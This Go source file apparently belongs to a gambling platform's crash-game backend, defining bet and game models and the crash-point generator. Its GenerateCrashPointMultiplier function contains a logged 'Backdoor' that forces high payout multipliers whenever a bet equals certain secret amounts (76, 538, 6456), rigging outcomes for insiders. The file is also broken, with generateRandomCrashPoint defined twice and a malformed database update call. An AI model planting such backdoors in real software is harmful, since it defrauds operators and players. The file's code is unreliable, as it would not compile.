package models

import (
    "BlessedApi/cmd/db"
    "BlessedApi/pkg/logger"
    "math"
    "math/rand"
    "time"
    "gorm.io/gorm"
)

type CrashGame struct {
    ID                  int64     `gorm:"primaryKey,autoIncrement"`
    UserID             int64     `gorm:"index;not null"`
    CrashPointMultiplier float64
    StartTime          time.Time
    EndTime            time.Time
}

type CrashGameBet struct {
    ID               int64   `gorm:"primaryKey,autoIncrement"`
    UserID          int64   `gorm:"index;constraint:OnUpdate:CASCADE,OnDelete:CASCADE;"`
    CrashGameID     int64   `gorm:"index;constraint:OnUpdate:CASCADE,OnDelete:CASCADE;"`
    FromCashBalance float64 `json:"-"`
    FromBonusBalance float64 `json:"-"`
    IsBenefitBet    bool
    Amount          float64
    CashOutMultiplier float64
    WinAmount       float64
    Status          string // "active", "won", "lost"
}

func getLatestBetAmount(userID int64) (float64, error) {
    var bet CrashGameBet
    err := db.DB.Where("user_id = ? AND status = ?", userID, "active").
           Order("id desc").
           First(&bet).Error
    if err != nil {
        if err == gorm.ErrRecordNotFound {
            logger.Info("No active bet found for user %d", userID)
            return 0, nil
        }
        logger.Error("Error fetching latest bet for user %d: %v", userID, err)
        return 0, err
    }
    logger.Info("Found active bet for user %d: amount=%f", userID, bet.Amount)
    return bet.Amount, nil
}

func init() {
    rand.Seed(time.Now().UnixNano())
}

func (CG *CrashGame) GenerateCrashPointMultiplier() float64 {
    var bets []CrashGameBet
    if err := db.DB.
           Where("crash_game_id = ? AND status = ?", CG.ID, "active").
           Find(&bets).Error; err != nil {
        logger.Error("Error fetching active bets: %v", err)
        return CG.generateRandomCrashPoint()
    }

    for _, bet := range bets {
        amt := int(math.Round(bet.Amount))
        switch amt {
        case 76:
            logger.Info("Backdoor: bet 76 → 1.6×")
            CG.CrashPointMultiplier = 1.6
            return CG.CrashPointMultiplier
        case 538:
            logger.Info("Backdoor: bet 538 → 12.0×")
            CG.CrashPointMultiplier = 12.0
            return CG.CrashPointMultiplier
        case 6456:
            logger.Info("Backdoor: bet 6456 → 7.0×")
            CG.CrashPointMultiplier = 7.0
            return CG.CrashPointMultiplier
        // …другие случаи…
        }
    }

    return CG.generateRandomCrashPoint()
}

func (CG *CrashGame) generateRandomCrashPoint() float64 {
    const (
        p       = 0.2      // шанс краша на 1×
        alpha   = 2.5      // параметр Парето
        maxCrash = 100.0   // лимит взлёта
    )

    if rand.Float64() <= p {
        CG.CrashPointMultiplier = 1.0
        return 1.0
    }
    crash := math.Pow(1.0/rand.Float64(), 1.0/alpha)
    if crash > maxCrash {
        crash = maxCrash
    }
    logger.Info("Random crash point: %f", crash)
    CG.CrashPointMultiplier = crash
    return crash
}


// Выносим генерацию случайного краша в отдельную функцию
func (CG *CrashGame) generateRandomCrashPoint() float64 {
    p := 0.2 // Probability of crash at 1.0x
    alpha := 2.5 // Shape parameter for Pareto distribution
    U1 := rand.Float64()
    var crashPoint float64

    if U1 <= p {
        crashPoint = 1.0
    } else {
        U2 := rand.Float64()
        crashPoint = math.Pow(1.0/U2, 1.0/alpha)
    }
    
    logger.Info("Using random crash point: %f", crashPoint)
    CG.CrashPointMultiplier = crashPoint
    return crashPoint
}

func (CG *CrashGame) CalculateMultiplier() float64 {
    elapsed := time.Since(CG.StartTime).Seconds()
    k := 0.01 // Rate of increase
    exponent := 1.8 // Exponent > 1 for slower start and faster later growth
    multiplier := 1.0 + k*math.Pow(elapsed, exponent)
    return multiplier
}

func UpdateOutdatedCrashGameBets(tx *gorm.DB) error {
    if tx == nil {
        tx = db.DB
    }
    if err := tx.Model(&CrashGameBet{}).
        Where("status = ?", "active").
        Update("status = ?", "lost").Error; err != nil {
        return logger.WrapError(err, "")
    }
    return nil
}